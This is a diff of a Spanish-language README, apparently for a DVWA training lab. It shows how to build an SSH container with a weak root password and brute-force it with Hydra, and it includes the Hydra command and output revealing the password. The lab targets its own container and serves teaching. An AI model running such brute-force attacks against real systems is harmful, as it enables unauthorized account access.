@@ -16,6 +16,7 @@ cd dvwa
 git checkout BruteForce
 
 2
+
 En la carpeta SSH, usamos el archivo Dockerfile, luego 
 
 docker build -t alpine-ssh SSH/.
@@ -23,6 +24,7 @@ docker build -t alpine-ssh SSH/.
 docker run --rm --publish=2222:22 alpine-ssh
 
 3
+
 Desde otra instancia podemos probar el acceso 
 
 ssh root@host -p 2222   por ejemplo ( ssh root@192.168.0.6 -p 2222 )
@@ -30,6 +32,7 @@ ssh root@host -p 2222   por ejemplo ( ssh root@192.168.0.6 -p 2222 )
 Ponemos el password: computer (que se configuro en el ejemplo, especificamente en el Dockerfile)
 
 4
+
 Ahora en otra instancia, usamos lo que hay en la carpeta HYDRA, usamos el archivo Dockerfile, luego
 
 git clone https://github.com/cesarbobadilla/dvwa.git
@@ -49,13 +52,21 @@ hydra -s 2222 -l root -P passlist.txt 192.168.0.6 -t 4 -V ssh
 Debería seguir ejecutando hasta que vea algo como
 
 ...
+
 ..
+
 .
+
 [ATTEMPT] target 192.168.0.17 - login "root" - pass "159753" - 55 of 9999 [child 0] (0/0)
+
 [ATTEMPT] target 192.168.0.17 - login "root" - pass "iloveyou1" - 56 of 9999 [child 2] (0/0)
+
 [2222][ssh] host: 192.168.0.17   login: root   password: computer
+
 1 of 1 target successfully completed, 1 valid password found
+
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-08-30 15:54:40
+
 
 Donde concluimos que la contraseña adivinada es "computer"
 
